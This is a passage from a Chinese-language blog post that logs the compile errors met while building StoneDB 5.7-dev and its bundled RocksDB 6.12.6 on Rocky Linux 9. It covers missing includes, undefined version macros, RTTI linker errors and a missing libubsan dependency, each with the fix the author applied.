&lt;optional&gt;</span><br><span class="line">   22 | #include &quot;data/pack.h&quot;</span><br><span class="line">/data/stonedb-stonedb-5.7-dev/storage/tianmu/data/pack_int.h:54:68: error: expected ‘,’ or ‘...’ before ‘&lt;’ token</span><br><span class="line">   54 |   void LoadValues(const loader::ValueCache *vc, const std::optional&lt;common::double_int_t&gt; &amp;null_value);</span><br><span class="line">      |                                                                    ^</span><br><span class="line">/data/stonedb-stonedb-5.7-dev/storage/tianmu/data/pack_int.h:120:66: error: ‘optional’ in namespace ‘std’ does not name a template type</span><br><span class="line">  120 |   void LoadValuesDouble(const loader::ValueCache *vc, const std::optional&lt;common::double_int_t&gt; &amp;nv);</span><br><span class="line">      |                                                                  ^~~~~~~~</span><br><span class="line">/data/stonedb-stonedb-5.7-dev/storage/tianmu/data/pack_int.h:120:61: note: ‘std::optional’ is defined in header ‘&lt;optional&gt;’; did you forget to ‘#include &lt;optional&gt;’?</span><br><span class="line">  120 |   void LoadValuesDouble(const loader::ValueCache *vc, const std::optional&lt;common::double_int_t&gt; &amp;nv);</span><br><span class="line">      |                                                             ^~~</span><br><span class="line">/data/stonedb-stonedb-5.7-dev/storage/tianmu/data/pack_int.h:120:74: error: expected ‘,’ or ‘...’ before ‘&lt;’ token</span><br><span class="line">  120 |   void LoadValuesDouble(const loader::ValueCache *vc, const std::optional&lt;common::double_int_t&gt; &amp;nv);</span><br><span class="line">      |                                                                          ^</span><br><span class="line">/data/stonedb-stonedb-5.7-dev/storage/tianmu/data/pack_int.h:121:65: error: ‘optional’ in namespace ‘std’ does not name a template type</span><br><span class="line">  121 |   void LoadValuesFixed(const loader::ValueCache *vc, const std::optional&lt;common::double_int_t&gt; &amp;nv);</span><br><span class="line">      |                                                                 ^~~~~~~~</span><br><span class="line">/data/stonedb-stonedb-5.7-dev/storage/tianmu/data/pack_int.h:121:60: note: ‘std::optional’ is defined in header ‘&lt;optional&gt;’; did you forget to ‘#include &lt;optional&gt;’?</span><br><span class="line">  121 |   void LoadValuesFixed(const loader::ValueCache *vc, const std::optional&lt;common::double_int_t&gt; &amp;nv);</span><br><span class="line">      |                                                            ^~~</span><br><span class="line">/data/stonedb-stonedb-5.7-dev/storage/tianmu/data/pack_int.h:121:73: error: expected ‘,’ or ‘...’ before ‘&lt;’ token</span><br><span class="line">  121 |   void LoadValuesFixed(const loader::ValueCache *vc, const std::optional&lt;common::double_int_t&gt; &amp;nv);</span><br><span class="line">      |                                                                         ^</span><br><span class="line">make[2]: *** [storage/tianmu/CMakeFiles/tianmu.dir/build.make:384: storage/tianmu/CMakeFiles/tianmu.dir/core/data_cache.cpp.o] Error 1</span><br><span class="line">make[1]: *** [CMakeFiles/Makefile2:3095: storage/tianmu/CMakeFiles/tianmu.dir/all] Error 2</span><br><span class="line">make: *** [Makefile:156: all] Error 2</span><br><span class="line">```</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>vi /data/stonedb-stonedb-5.7-dev/storage/tianmu/data/pack_int.h<br>
#include <optional></p>
<p><a class="link"   href="https://github.com/NixOS/patchelf/issues/342" >https://github.com/NixOS/patchelf/issues/342 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>==================================================================================</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[ 40%] Building CXX object storage/tianmu/CMakeFiles/tianmu.dir/core/delta_table.cpp.o</span><br><span class="line">In file included from /data/stonedb-stonedb-5.7-dev/storage/tianmu/core/delta_table.h:25,</span><br><span class="line">                 from /data/stonedb-stonedb-5.7-dev/storage/tianmu/core/delta_table.cpp:18:</span><br><span class="line">/data/stonedb-stonedb-5.7-dev/storage/tianmu/index/kv_store.h:119:8: error: ‘condition_variable’ in namespace ‘std’ does not name a type</span><br><span class="line">  119 |   std::condition_variable cv_drop_;</span><br><span class="line">      |        ^~~~~~~~~~~~~~~~~~</span><br><span class="line">/data/stonedb-stonedb-5.7-dev/storage/tianmu/index/kv_store.h:34:1: note: ‘std::condition_variable’ is defined in header ‘&lt;condition_variable&gt;’; did you forget to ‘#include &lt;condition_variable&gt;’?</span><br><span class="line">   33 | #include &quot;rocksdb/utilities/write_batch_with_index.h&quot;</span><br><span class="line">  +++ |+#include &lt;condition_variable&gt;</span><br><span class="line">   34 | #include &quot;util/fs.h&quot;</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">vi /data/stonedb-stonedb-5.7-dev/storage/tianmu/index/kv_store.h</span><br><span class="line">#include &lt;condition_variable&gt;</span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">[ 40%] Building CXX object storage/tianmu/CMakeFiles/tianmu.dir/core/tianmu_table.cpp.o</span><br><span class="line">In file included from /data/stonedb-stonedb-5.7-dev/storage/tianmu/core/tianmu_table.h:24,</span><br><span class="line">                 from /data/stonedb-stonedb-5.7-dev/storage/tianmu/core/engine.h:35,</span><br><span class="line">                 from /data/stonedb-stonedb-5.7-dev/storage/tianmu/core/tianmu_table.cpp:25:</span><br><span class="line">/data/stonedb-stonedb-5.7-dev/storage/tianmu/core/delta_table.h:118:51: warning: ‘maybe_unused’ attribute ignored [-Wattributes]</span><br><span class="line">  118 |   [[maybe_unused]] bool current_record_fetched_ = false;</span><br><span class="line">      |                                                   ^~~~~</span><br><span class="line">In file included from /data/stonedb-stonedb-5.7-dev/release/rocksdb-6.12.6/util/timer.h:18,</span><br><span class="line">                 from /data/stonedb-stonedb-5.7-dev/storage/tianmu/core/tianmu_table.cpp:39:</span><br><span class="line">/data/stonedb-stonedb-5.7-dev/release/rocksdb-6.12.6/util/mutexlock.h:31:22: error: ‘port’ has not been declared</span><br><span class="line">   31 |   explicit MutexLock(port::Mutex *mu) : mu_(mu) &#123;</span><br><span class="line">      |                      ^~~~</span><br><span class="line">/data/stonedb-stonedb-5.7-dev/release/rocksdb-6.12.6/util/mutexlock.h:31:33: error: expected ‘)’ before ‘*’ token</span><br><span class="line">   31 |   explicit MutexLock(port::Mutex *mu) : mu_(mu) &#123;</span><br><span class="line">      |                     ~           ^~</span><br><span class="line">      |                                 )</span><br><span class="line">```</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>vi /data/stonedb-stonedb-5.7-dev/release/rocksdb-6.12.6/util/mutexlock.h</p>
<p>#pragma once<br>
#include &lt;assert.h&gt;<br>
#include <atomic><br>
#include <functional><br>
#include <memory><br>
#include <mutex><br>
#include <thread><br>
#include “port/port_posix.h” – hard code<br>
#include “util/hash.h”</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/data/stonedb-stonedb-5.7-dev/storage/tianmu/core/tianmu_table.cpp:1100:10: error: ‘Timer’ is not a member of ‘Tianmu::utils’; did you mean ‘rocksdb::Timer’?</span><br><span class="line"> 1100 |   utils::Timer timer;</span><br><span class="line">      |          ^~~~~</span><br><span class="line">In file included from /data/stonedb-stonedb-5.7-dev/storage/tianmu/core/tianmu_table.cpp:39:</span><br><span class="line">/data/stonedb-stonedb-5.7-dev/release/rocksdb-6.12.6/util/timer.h:35:7: note: ‘rocksdb::Timer’ declared here</span><br><span class="line">   35 | class Timer &#123;</span><br><span class="line">      |       ^~~~~</span><br><span class="line">/data/stonedb-stonedb-5.7-dev/storage/tianmu/core/tianmu_table.cpp:1135:3: error: ‘timer’ was not declared in this scope; did you mean ‘timex’?</span><br><span class="line"> 1135 |   timer.Print(__PRETTY_FUNCTION__);</span><br><span class="line">      |   ^~~~~</span><br><span class="line">      |   timex</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /data/stonedb-stonedb-5.7-dev/storage/tianmu/core/tianmu_table.cpp</span><br><span class="line">:1100</span><br><span class="line">:1135</span><br><span class="line"></span><br><span class="line">timer 注释掉，解决</span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">/data/stonedb-stonedb-5.7-dev/storage/tianmu/loader/load_parser.cpp: In constructor ‘Tianmu::loader::LoadParser::LoadParser(Tianmu::loader::LoadParser::TianmuAttrPtrVect_t&amp;, const Tianmu::system::IOParameters&amp;, uint, std::unique_ptr&lt;Tianmu::system::Stream&gt;&amp;)’:</span><br><span class="line">/data/stonedb-stonedb-5.7-dev/storage/tianmu/loader/load_parser.cpp:43:10: error: ‘Timer’ is not a member of ‘Tianmu::utils’; did you mean ‘rocksdb::Timer’?</span><br><span class="line">   43 |   utils::Timer timer;</span><br><span class="line">      |          ^~~~~</span><br><span class="line">```</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>vi /data/stonedb-stonedb-5.7-dev/storage/tianmu/loader/load_parser.cpp</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[ 42%] Building CXX object storage/tianmu/CMakeFiles/tianmu.dir/util/timer.cpp.o</span><br><span class="line">/data/stonedb-stonedb-5.7-dev/storage/tianmu/util/timer.cpp:25:6: error: ‘Timer’ has not been declared</span><br><span class="line">   25 | void Timer::DoPrint(const std::string &amp;msg) const &#123;</span><br><span class="line">      |      ^~~~~</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /data/stonedb-stonedb-5.7-dev/storage/tianmu/util/timer.cpp</span><br><span class="line"></span><br><span class="line">-------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rocksdb 版本太旧的问题?</span><br><span class="line"></span><br><span class="line">https://github.com/facebook/rocksdb/issues/9388</span><br><span class="line">Dropping some compiler support in 7.0 #9388</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rocksdb-6.12.6 什么时候的版本？</span><br><span class="line"></span><br><span class="line">https://github.com/facebook/rocksdb/issues/9925</span><br><span class="line">yum install -y bzip2-devel gcc-c++ gflags-devel libzstd-devel lz4-devel perl-interpreter python3 snappy-devel zlib-devel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">https://github.com/facebook/rocksdb/commit/fd3e0f43b3cd041c38e37543e0b616d18ca55179#diff-80764747afb62b8a0bcae21d43ed3436ae26fcdfaf3a3978c0aa9ab4265d1f22</span><br><span class="line">vi /data/stonedb-stonedb-5.7-dev/release/rocksdb-6.12.6/build_tools/build_detect_platform</span><br><span class="line"># thread_local is part of C++11 and later (TODO: clean up this define)</span><br><span class="line">COMMON_FLAGS=&quot;$COMMON_FLAGS -DROCKSDB_SUPPORT_THREAD_LOCAL&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">https://github.com/arangodb/arangodb/issues/1814</span><br><span class="line">#include &quot;port/port_posix.h&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">----------------------------------------------------</span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">[ 40%] Building CXX object storage/tianmu/CMakeFiles/tianmu.dir/mm/mysql_heap_policy.cpp.o</span><br><span class="line">In file included from /data/stonedb-stonedb-5.7-dev/storage/tianmu/mm/mysql_heap_policy.h:23,</span><br><span class="line">                 from /data/stonedb-stonedb-5.7-dev/storage/tianmu/mm/mysql_heap_policy.cpp:18:</span><br><span class="line">/data/stonedb-stonedb-5.7-dev/storage/tianmu/mm/heap_policy.h:30:20: error: expected ‘)’ before ‘sz’</span><br><span class="line">   30 |   HeapPolicy(size_t sz) : size_(sz), heap_status_(HEAP_STATUS::HEAP_ERROR) &#123;&#125;</span><br><span class="line">      |             ~      ^~~</span><br><span class="line">      |                    )</span><br><span class="line">/data/stonedb-stonedb-5.7-dev/storage/tianmu/mm/heap_policy.h:33:23: error: ‘size_t’ has not been declared</span><br><span class="line">   33 |   virtual void *alloc(size_t size) = 0;</span><br><span class="line">      |                       ^~~~~~</span><br><span class="line">/data/stonedb-stonedb-5.7-dev/storage/tianmu/mm/heap_policy.h:35:38: error: ‘size_t’ has not been declared</span><br><span class="line">   35 |   virtual void *rc_realloc(void *mh, size_t size) = 0;</span><br><span class="line">      |                                      ^~~~~~</span><br><span class="line">/data/stonedb-stonedb-5.7-dev/storage/tianmu/mm/heap_policy.h:36:11: error: ‘size_t’ does not name a type</span><br><span class="line">   36 |   virtual size_t getBlockSize(void *mh) = 0;</span><br><span class="line">      |           ^~~~~~</span><br><span class="line">/data/stonedb-stonedb-5.7-dev/storage/tianmu/mm/heap_policy.h:22:1: note: ‘size_t’ is defined in header ‘&lt;cstddef&gt;’; did you forget to ‘#include &lt;cstddef&gt;’?</span><br><span class="line">   21 | #include &quot;mm/memory_block.h&quot;</span><br><span class="line">  +++ |+#include &lt;cstddef&gt;</span><br><span class="line">   22 |</span><br><span class="line">```</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>vi /data/stonedb-stonedb-5.7-dev/storage/tianmu/mm/heap_policy.h</p>
<ul>
<li>#include <cstddef></li>
</ul>
<p>–&gt;</p>
<hr>
<h3 id="STONEDB-xxx-参数未声明"><code>STONEDB_xxx</code> 参数未声明</h3>
<p>进度跳跃到了 98%，遇到了四个参数没声明的情况。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[ 98%] Building CXX object sql/CMakeFiles/sql.dir/mysqld.cc.o</span><br><span class="line">In file included from /data/stonedb-stonedb-5.7-dev/sql/table.h:37,</span><br><span class="line">                 from /data/stonedb-stonedb-5.7-dev/sql/field.h:37,</span><br><span class="line">                 from /data/stonedb-stonedb-5.7-dev/sql/protocol_classic.h:27,</span><br><span class="line">                 from /data/stonedb-stonedb-5.7-dev/sql/sql_class.h:40,</span><br><span class="line">                 from /data/stonedb-stonedb-5.7-dev/sql/sql_parse.h:29,</span><br><span class="line">                 from /data/stonedb-stonedb-5.7-dev/sql/mysqld.cc:57:</span><br><span class="line">/data/stonedb-stonedb-5.7-dev/libbinlogevents/include/table_id.h: In member function ‘Table_id Table_id::operator++(int)’:</span><br><span class="line">...</span><br><span class="line">/data/stonedb-stonedb-5.7-dev/sql/mysqld.cc: In function ‘void print_build_info()’:</span><br><span class="line">/data/stonedb-stonedb-5.7-dev/sql/mysqld.cc:7049:33: error: ‘STONEDB_BRANCH_NAME’ was not declared in this scope</span><br><span class="line"> 7049 |   printf(&quot;\tBranch name: %s\n&quot;, STONEDB_BRANCH_NAME);</span><br><span class="line">      |                                 ^~~~~~~~~~~~~~~~~~~</span><br><span class="line">/data/stonedb-stonedb-5.7-dev/sql/mysqld.cc:7050:36: error: ‘STONEDB_COMMIT_ID’ was not declared in this scope</span><br><span class="line"> 7050 |   printf(&quot;\tLast commit ID: %s\n&quot;, STONEDB_COMMIT_ID);</span><br><span class="line">      |                                    ^~~~~~~~~~~~~~~~~</span><br><span class="line">/data/stonedb-stonedb-5.7-dev/sql/mysqld.cc:7051:38: error: ‘STONEDB_COMMIT_TIME’ was not declared in this scope; did you mean ‘STONEDB_BUILD_TIME’?</span><br><span class="line"> 7051 |   printf(&quot;\tLast commit time: %s\n&quot;, STONEDB_COMMIT_TIME);</span><br><span class="line">      |                                      ^~~~~~~~~~~~~~~~~~~</span><br><span class="line">      |                                      STONEDB_BUILD_TIME</span><br><span class="line">/data/stonedb-stonedb-5.7-dev/sql/mysqld.cc: In function ‘void set_server_version()’:</span><br><span class="line">/data/stonedb-stonedb-5.7-dev/sql/mysqld.cc:8134:31: error: ‘STONEDB_TAG_NAME’ was not declared in this scope</span><br><span class="line"> 8134 |       static_cast&lt;int&gt;(sizeof(STONEDB_TAG_NAME)))</span><br><span class="line">      |                               ^~~~~~~~~~~~~~~~</span><br><span class="line">make[2]: *** [sql/CMakeFiles/sql.dir/build.make:3110: sql/CMakeFiles/sql.dir/mysqld.cc.o] Error 1</span><br><span class="line">make[1]: *** [CMakeFiles/Makefile2:5823: sql/CMakeFiles/sql.dir/all] Error 2</span><br></pre></td></tr></table></figure></div>
<p>找到了一个 Issue <a class="link"   href="https://github.com/stoneatom/stonedb/issues/1328" >#1328 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，只是，并非每个人都用 git 下载代码。</p>
<p>所以，这里找到这四个变量，直接替换掉。</p>
<p><a class="link"   href="https://github.com/stoneatom/stonedb/blob/stonedb-5.7-dev/sql/mysqld.cc#L7049" >https://github.com/stoneatom/stonedb/blob/stonedb-5.7-dev/sql/mysqld.cc#L7049 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">STONEDB_BRANCH_NAME</span><br><span class="line">STONEDB_COMMIT_ID</span><br><span class="line">STONEDB_COMMIT_TIME</span><br><span class="line">STONEDB_TAG_NAME</span><br></pre></td></tr></table></figure></div>
<hr>
<!--

[100%] Linking CXX executable mysqld
/usr/bin/ld: cannot find -lmarisa
/usr/bin/ld: cannot find -lrocksdb
collect2: error: ld returned 1 exit status
make[2]: *** [sql/CMakeFiles/mysqld.dir/build.make:129: sql/mysqld] Error 1
make[1]: *** [CMakeFiles/Makefile2:5589: sql/CMakeFiles/mysqld.dir/all] Error 2


<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">$ cd marisa-trie</span><br><span class="line">$ autoreconf -i</span><br><span class="line">$ ./configure --enable-native-code</span><br><span class="line">$ make</span><br><span class="line">$ make install</span><br><span class="line"></span><br><span class="line">/usr/local/lib/libmarisa.so</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">https://github.com/twmht/python-rocksdb/issues/13</span><br><span class="line">export CPLUS_INCLUDE_PATH=$&#123;CPLUS_INCLUDE_PATH&#125;:`pwd`/../include</span><br><span class="line">export LD_LIBRARY_PATH=$&#123;LD_LIBRARY_PATH&#125;:`pwd`</span><br><span class="line">export LIBRARY_PATH=$&#123;LIBRARY_PATH&#125;:`pwd`</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<ul>
<li>[recommended] <code>make static_lib</code> will compile librocksdb.a, RocksDB static library. Compiles static library in release mode.</li>
<li><code>make shared_lib</code> will compile <a class="link"   href="http://librocksdb.so" >librocksdb.so <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, RocksDB shared library. Compiles shared library in release mode.</li>
</ul>
<p>[shawnyan@rocky9 rocksdb-6.12.6]$ make shared_lib<br>
$DEBUG_LEVEL is 0</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">  CC       table/block_based/block_based_table_builder.o</span><br><span class="line">table/block_based/block_based_table_builder.cc: In member function ‘void rocksdb::BlockBasedTableBuilder::EnterUnbuffered()’:</span><br><span class="line">table/block_based/block_based_table_builder.cc:1601:30: error: ‘block_rep’ may be used uninitialized [-Werror=maybe-uninitialized]</span><br><span class="line"> 1601 |       std::swap(*(block_rep-&gt;data), data_block);</span><br><span class="line">      |                  ~~~~~~~~~~~~^~~~~</span><br><span class="line">table/block_based/block_based_table_builder.cc:1598:41: note: ‘block_rep’ declared here</span><br><span class="line"> 1598 |       ParallelCompressionRep::BlockRep* block_rep;</span><br><span class="line">      |                                         ^~~~~~~~~</span><br><span class="line">cc1plus: all warnings being treated as errors</span><br><span class="line">make: *** [Makefile:2166: table/block_based/block_based_table_builder.o] Error 1</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">DISABLE_WARNING_AS_ERROR=1 make shared_lib</span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">  CCLD     librocksdb.so.6.12.6</span><br><span class="line">ln -fs librocksdb.so.6.12.6 librocksdb.so.6.12</span><br><span class="line">ln -fs librocksdb.so.6.12.6 librocksdb.so.6</span><br><span class="line">ln -fs librocksdb.so.6.12.6 librocksdb.so</span><br><span class="line">[shawnyan@rocky9 rocksdb-6.12.6]$</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">sudo ln -s librocksdb.so /usr/lib64/librocksdb.so</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>DISABLE_WARNING_AS_ERROR=1 make  shared_lib  EXTRA_CXXFLAGS=-fPIC EXTRA_CFLAGS=-fPIC USE_RTTI=1 DEBUG_LEVEL=0</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$DEBUG_LEVEL is 0</span><br><span class="line">  GEN      util/build_version.cc</span><br><span class="line">  CCLD     librocksdb.so.6.12.6</span><br><span class="line">ln -fs librocksdb.so.6.12.6 librocksdb.so.6.12</span><br><span class="line">ln -fs librocksdb.so.6.12.6 librocksdb.so.6</span><br><span class="line">ln -fs librocksdb.so.6.12.6 librocksdb.so</span><br></pre></td></tr></table></figure></div>
<hr>
<p>[100%] Linking CXX executable mysqld<br>
/bin/ld: …/archive_output_directory/libtianmu.a(merge_operator.cpp.o)😦.data.rel.ro._ZTIN6Tianmu4core19RecordMergeOperatorE[_ZTIN6Tianmu4core19RecordMergeOperatorE]+0x10): undefined reference to `typeinfo for rocksdb::AssociativeMergeOperator’<br>
collect2: error: ld returned 1 exit status<br>
make[2]: *** [sql/CMakeFiles/mysqld.dir/build.make:129: sql/mysqld] Error 1<br>
make[1]: *** [CMakeFiles/Makefile2:5589: sql/CMakeFiles/mysqld.dir/all] Error 2<br>
make: *** [Makefile:156: all] Error 2</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[shawnyan@rocky9 include]$ ln -s ../release/rocksdb-6.12.6/include/rocksdb/</span><br><span class="line">rwxrwxrwx. 1 shawnyan shawnyan    42 Nov 11 18:30 rocksdb -&gt; ../release/rocksdb-6.12.6/include/rocksdb/</span><br><span class="line">[shawnyan@rocky9 include]$ pwd</span><br><span class="line">/data/stonedb-stonedb-5.7-dev/include</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/data/stonedb-stonedb-5.7-dev/release/rocksdb-6.12.6/librocksdb.a</span><br><span class="line">archive_output_directory/librocksdb.a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">https://github.com/facebook/rocksdb/issues/3811</span><br><span class="line">DISABLE_WARNING_AS_ERROR=1 make  static_lib  EXTRA_CXXFLAGS=-fPIC EXTRA_CFLAGS=-fPIC USE_RTTI=1 DEBUG_LEVEL=0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[shawnyan@rocky9 rocksdb-6.12.6]$ DISABLE_WARNING_AS_ERROR=1 make  static_lib  EXTRA_CXXFLAGS=-fPIC EXTRA_CFLAGS=-fPIC USE_RTTI=1 DEBUG_LEVEL=0</span><br><span class="line">$DEBUG_LEVEL is 0</span><br><span class="line">  GEN      util/build_version.cc</span><br><span class="line">  AR       librocksdb.a</span><br><span class="line">/bin/ar: creating librocksdb.a</span><br><span class="line">[shawnyan@rocky9 rocksdb-6.12.6]$</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DISABLE_WARNING_AS_ERROR=1 DEBUG_LEVEL=0 EXTRA_CXXFLAGS=-fPIC EXTRA_CFLAGS=-fPIC USE_RTTI=1 make</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">export LD_LIBRARY_PATH=/data/stonedb-stonedb-5.7-dev/release/rocksdb-6.12.6</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[shawnyan@rocky9 sql]$ cmake -E cmake_link_script CMakeFiles/mysqld.dir/link.txt --verbose=1</span><br><span class="line">/usr/bin/c++ -frtti -fsanitize=undefined -fno-sanitize=vptr -fPIC -std=gnu++03 -fno-omit-frame-pointer -fno-strict-aliasing  -Wall -Wextra -Wformat-security -Wvla -Wimplicit-fallthrough=2 -Wno-unknown-pragmas -Woverloaded-virtual -Wno-unused-parameter -Wno-class-memaccess -ffunction-sections -fdata-sections -O3 -g -DNDEBUG -gdwarf-2 -std=c++1z -fno-sized-deallocation  -Wl,--build-id -static-libstdc++ -static-libgcc -Wl,--export-dynamic CMakeFiles/mysqld.dir/main.cc.o -o mysqld   -L/data/stonedb-stonedb-5.7-dev/release/lib  -L/data/stonedb-stonedb-5.7-dev/release/rocksdb-6.12.6  -L/data/stonedb-stonedb-5.7-dev/release/marisa-trie-0.2.6  -L/data/stonedb-stonedb-5.7-dev/release/marisa-trie-0.2.6/lib  -Wl,-rpath,/data/stonedb-stonedb-5.7-dev/release/lib:/data/stonedb-stonedb-5.7-dev/release/rocksdb-6.12.6:/data/stonedb-stonedb-5.7-dev/release/marisa-trie-0.2.6:/data/stonedb-stonedb-5.7-dev/release/marisa-trie-0.2.6/lib:/usr/local/lib64:/usr/lib64: ../archive_output_directory/libsql.a ../archive_output_directory/libbinlog.a ../archive_output_directory/librpl.a ../archive_output_directory/libmaster.a ../archive_output_directory/libslave.a ../archive_output_directory/libsql.a ../archive_output_directory/libmysys.a ../archive_output_directory/libmysys_ssl.a ../libbinlogevents/lib/libbinlogevents.a ../archive_output_directory/libarchive.a ../archive_output_directory/libblackhole.a ../archive_output_directory/libcsv.a ../archive_output_directory/libfederated.a ../archive_output_directory/libheap.a ../archive_output_directory/libinnobase.a -laio ../archive_output_directory/liblz4_lib.a -lnuma ../archive_output_directory/libmyisam.a ../archive_output_directory/libmyisammrg.a ../archive_output_directory/libpartition.a ../archive_output_directory/libperfschema.a ../archive_output_directory/libtianmu.a -lboost_system -lstdc++fs -lsnappy -lbz2 -llz4 -lzstd -lmarisa -lrocksdb -lboost_thread ../archive_output_directory/libngram_parser.a ../archive_output_directory/libvio.a ../archive_output_directory/libregex.a -lcrypt /usr/local/lib64/libssl.so /usr/local/lib64/libcrypto.so ../archive_output_directory/libmysys.a ../archive_output_directory/libdbug.a ../archive_output_directory/libmysys.a ../archive_output_directory/libdbug.a ../archive_output_directory/libz.a ../archive_output_directory/libstrings.a ../archive_output_directory/librocksdb.a -lm -latomic</span><br><span class="line"></span><br><span class="line">rtti</span><br><span class="line">no-rtti</span><br><span class="line"></span><br><span class="line">/bin/ld: ../archive_output_directory/libtianmu.a(merge_operator.cpp.o):(.data.rel.ro._ZTIN6Tianmu4core19RecordMergeOperatorE[_ZTIN6Tianmu4core19RecordMergeOperatorE]+0x10): undefined reference to `typeinfo for rocksdb::AssociativeMergeOperator&#x27;</span><br><span class="line">collect2: error: ld returned 1 exit status</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>vi sql/CMakeFiles/mysqld.dir/link.txt<br>
-fsanitize=undefined -fno-sanitize=vptr</p>
<p><a class="link"   href="https://stackoverflow.com/questions/11904519/c-what-are-the-causes-of-undefined-reference-to-typeinfo-for-class-name" >https://stackoverflow.com/questions/11904519/c-what-are-the-causes-of-undefined-reference-to-typeinfo-for-class-name <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
If you’re compiling with RTTI (-frtti), make sure your dependent libraries are also compiled with it, and not -fno-rtti. Otherwise you will get the typeinfo error when you subclass a class compiled with -fno-rtti or use dynamic_cast.</p>
<p>–&gt;</p>
<hr>
<h3 id="缺少依赖-libubsan">缺少依赖 <code>libubsan</code></h3>
<p>在接近 100% 时，遇到了报错。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">/usr/bin/ld: cannot find /usr/lib64/libubsan.so.1.0.0</span><br><span class="line">collect2: error: ld returned 1 exit status</span><br></pre></td></tr></table></figure></div>
<p>只需安装对应的包即可。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">yum install libubsan</span><br></pre></td></tr></table></figure></div>
<!--
https://blogs.oracle.com/linux/post/reverse-engineering-ubsan
https://runebook.dev/ja/docs/mariadb/compile-and-using-mariadb-with-sanitizers-asan-ubsan-tsan-msan/index
-->
<h2 id="完整的编译日志">完整的编译日志</h2>
<p>编译终于通关，来看下完整的日志。</p>
<!--
DISABLE_WARNING_AS_ERROR=1 DEBUG_LEVEL=0 EXTRA_CXXFLAGS=-fPIC EXTRA_CFLAGS=-fPIC USE_RTTI=1 make
-->
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 release]$ DISABLE_WARNING_AS_ERROR=1 DEBUG_LEVEL=0 make</span><br><span class="line">[  0%] Built target abi_check</span><br><span class="line">[  0%] Built target lz4_lib</span><br><span class="line">[  0%] Built target INFO_SRC</span><br><span class="line">[  0%] Built target INFO_BIN</span><br><span class="line">[  0%] Built target zlib</span><br><span class="line">[  0%] Built target libedit_emacs</span><br><span class="line">[  0%] Built target libedit_vi</span><br><span class="line">[  0%] Built target libedit_common</span><br><span class="line">[  0%] Built target libedit_fcns</span><br><span class="line">[  0%] Built target libedit_help</span><br><span class="line">[  1%] Built target libedit_func</span><br><span class="line">[  3%] Built target edit</span><br><span class="line">[  3%] Built target event_pthreads</span><br><span class="line">[  4%] Built target event_core</span><br><span class="line">[  4%] Built target event_openssl</span><br><span class="line">[  4%] Built target event_extra</span><br><span class="line">[  7%] Built target strings</span><br><span class="line">[  7%] Built target gen_dtrace_header</span><br><span class="line">[ 11%] Built target mysys</span><br><span class="line">[ 11%] Built target dbug</span><br><span class="line">[ 12%] Built target vio</span><br><span class="line">[ 12%] Built target regex</span><br><span class="line">[ 12%] Built target base64_test</span><br><span class="line">[ 12%] Built target queues</span><br><span class="line">[ 13%] Built target thr_lock</span><br><span class="line">[ 14%] Built target 